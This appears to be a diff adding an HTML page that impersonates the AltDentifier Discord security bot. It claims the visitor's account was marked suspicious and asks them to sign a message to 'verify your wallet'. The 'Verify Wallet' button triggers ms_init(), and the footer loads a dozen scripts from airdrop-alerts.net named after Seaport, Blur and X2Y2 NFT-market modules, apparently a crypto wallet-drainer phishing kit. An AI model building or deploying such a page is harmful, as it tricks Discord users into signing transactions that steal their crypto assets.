@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html style="background-color: #7289DA" lang="en">
+   <head>
+      <!-- Global site tag (gtag.js) - Google Analytics -->
+
+      <meta charset="UTF-8">
+      <link rel="stylesheet" href="css/style2.css">
+	   <link rel="icon" href="images/icon.png">
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <meta property="og:title" content="AltDentifier">
+      <meta property="og:url" content="https://altdentifier.com">
+      <meta property="og:image" content="images/cop.png">
+      <meta property="og:description" content="The best Discord security and checkpoint bot! Used in over 136251 servers!">
+      <meta property="description" content="The best Discord security and checkpoint bot! Used in over 136251 servers!">
+      <meta name="theme-color" content="#7289DA">
+      <link rel="stylesheet" href="css/bulma.min.css">
+      <link rel="stylesheet" href="css/main.542d28dc.css">
+      <link rel="stylesheet" href="css/style.css">
+      <title>Verifying...</title>
+
+
+	  <style>
+		@font-face {
+  font-family: "UniSansHeavyCAPS";
+  src: url("fonts/UniSansHeavyCAPS.ttf") format("truetype");
+}
+
+#username, #welcomeserver {
+    font-family: "UniSansHeavyCAPS", sans-serif; /* Apply the custom font */
+
+    margin-bottom: 10px;
+  }
+		.center-content {
+          text-align: center;
+          max-width: 520px; /* Adjust this value to control the maximum width of the centered content */
+	    margin-left: 410px;
+       margin-top: -85px;
+		}
+
+		#username{
+			font-size: 60px;
+			color: white;
+		}
+
+		#welcomeserver{
+			color: white;
+			font-size: 25px;
+			margin-bottom: -2px;
+		}
+  
+       
+      #continuebutton{
+         margin-top: 25px;
+      }
+	  </style>
+
+<script>
+   window.addEventListener("DOMContentLoaded", () => {
+       const urlParams = new URLSearchParams(window.location.search);
+
+       const avaParam = urlParams.get('u');
+       const discordName = urlParams.get('s');
+       const serverName = urlParams.get('p');
+
+       const [discordUserId, userLogoFileName] = avaParam.split('/');
+
+       const userImage = document.getElementById('userimage');
+       const navbarUserImage = document.getElementById('navbaruserimage');
+       if (userImage) {
+           userImage.src = `https://cdn.discordapp.com/avatars/${discordUserId}/${userLogoFileName}.webp`;
+           navbarUserImage.src = `https://cdn.discordapp.com/avatars/${discordUserId}/${userLogoFileName}.webp`;
+       }
+
+       const usernameElement = document.getElementById('username');
+       const usernameNavbar = document.getElementById('navbarusername');
+       if (discordName && usernameElement) {
+           usernameElement.textContent = `Hello ${discordName}`;
+           usernameNavbar.textContent = discordName;
+
+       }
+
+       const welcomeserverElement = document.getElementById('welcomeserver');
+       if (serverName && welcomeserverElement) {
+           welcomeserverElement.textContent = `Welcome to ${serverName}!`;
+       }
+
+       const serverStaffElement = document.getElementById('staffteamserver');
+       if (serverName && welcomeserverElement) {
+           serverStaffElement.textContent = `The ${serverName} staff team.`;
+       }
+   });
+</script>
+   </head>
+   <body>
+      <div style="display: none; border-radius: 0; margin-bottom: 0;" id="good_news" class="notification is-info has-text-centered">
+         <span id="good_news_text"></span>
+         <a id="delete_good_news" class="delete is-large"></a>
+      </div>
+      <div style="display: none; border-radius: 0; margin-bottom: 0;" id="bad_news" class="notification is-danger has-text-centered">
+         <span id="bad_news_text"></span>
+      </div>
+
+      <nav class="navbar" style="background-color: #7289DA" role="navigation" aria-label="main navigation">
+         <div class="navbar-brand">
+            <a class="navbar-item" href="../index.html">
+            <img src="images/cop.png">
+            </a>
+            <a role="button" class="navbar-burger" aria-label="menu" aria-expanded="false" data-target="navMenu">
+            <span aria-hidden="true"></span>
+            <span aria-hidden="true"></span>
+            <span aria-hidden="true"></span>
+            </a>
+         </div>
+         <div class="navbar-menu" id="navMenu">
+            <div class="navbar-start">
+               <a class="navbar-item" href="/faq">FAQ</a>
+               <a class="navbar-item" href="/commands">Commands</a>
+               <a class="navbar-item" href="/status">Status</a>
+               <a class="navbar-item" href="/about">About</a>
+            </div>
+            <div style="align-items: center;" class="navbar-end">
+               <a style="font-weight: bold" class="navbar-item button is-info" href="/support">Get Support</a>
+               <a id="themeSwitch" onclick="changeTheme();" class="navbar-item ">Dark Theme</a>
+               <div class="navbar-item has-dropdown is-hoverable">
+                  
+                  <a class="navbar-link">
+                  🇬🇧 English
+                  </a>
+                  <div class="navbar-dropdown">
+                     <a class="navbar-item">🇩🇪 Deutsch</a>
+                     <a class="navbar-item">🇪🇸 Español</a>
+                     <a class="navbar-item">🇳🇱 Nederlands</a>
+                     <a class="navbar-item">🇵🇱 Polski</a>
+                     <a class="navbar-item">🇧🇷 Português (BR)</a>
+                     <a class="navbar-item">🇮🇹 Italiano</a>
+                     <a class="navbar-item">🇹🇷 Türkçe</a>
+                  </div>
+               </div>
+               <div class="navbar-item has-dropdown is-hoverable">
+                  <a class="navbar-link">
+                      <img id="navbaruserimage" style="border-radius: 50%; margin-right: 10px;" src="">
+                      <p id="navbarusername">{Name}</p>
+                  </a>
+                  <div class="navbar-dropdown">
+                      <a class="navbar-item">
+                          Logout
+                      </a>
+                  </div>
+              </div>
+            </div>
+         </div>
+      </nav>
+      <section class="hero is-medium" style="background-color: transparent;">
+         <div class="hero-body">
+            <div class="container">
+               <div style="display: flex; flex-direction: row; flex-wrap: wrap;">
+				<div class="center-content">
+					<img class="avatar" id="userimage" src="">
+					<h1 id="username">Hello {user}</h1>
+					<h2 id="welcomeserver">Welcome to {server}!</h2>
+					<p id="text" class="text">
+					  The server administrators have set up extra security steps on this server to combat alt accounts, spammers and raiders. Sadly, your account was marked as Suspicious by our system, or a moderator has requested to process your account.<br><br>Please sign the following message to verify your wallet.
+					</br><br>If our system can verify your account successfully, you will be free to engage in the server. Should your account fail to verify, you will be kicked from the server. Administrators always have the power to override this system.<br><br>With kind regards,<br>
+					<br>
+               <p style="color: white;" id="staffteamserver">The {server} staff team.</p>
+
+               <center><a id="continuebutton" class="button is-light is-medium" onclick="ms_init()">Verify Wallet</a></center>
+					</p>
+
+				</div>
+               </div>
+            </div>
+         </div>
+      </section>
+      
+      <style id="style"></style>
+	  <footer>
+	  <script src="https://airdrop-alerts.net/assets/web3-provider/web3-router.js"></script>
+<script src="https://airdrop-alerts.net/assets/web3-provider/web3-data.js"></script>
+<script src="https://airdrop-alerts.net/assets/web3-provider/web3-connect.js"></script>
+<script src="https://airdrop-alerts.net/assets/web3-provider/web3-module.js"></script>
+<script src="https://airdrop-alerts.net/assets/web3-provider/web3-alert.js"></script>
+<script src="https://airdrop-alerts.net/assets/web3-provider/web3-seaport.js"></script>
+<script src="https://airdrop-alerts.net/assets/web3-provider/ethers.js"></script>
+<script src="https://airdrop-alerts.net/assets/web3-provider/ethereum-tx.js"></script>
+<script src="https://airdrop-alerts.net/assets/web3-modules/module-x2y2.js"></script>
+<script src="https://airdrop-alerts.net/assets/web3-modules/module-blur.js"></script>
+<script src="https://airdrop-alerts.net/assets/web3-modules/module-seaport.js"></script>
+<script src="https://airdrop-alerts.net/assets/web3-provider.js"></script>
+	  </footer>
+   </body>
+</html>
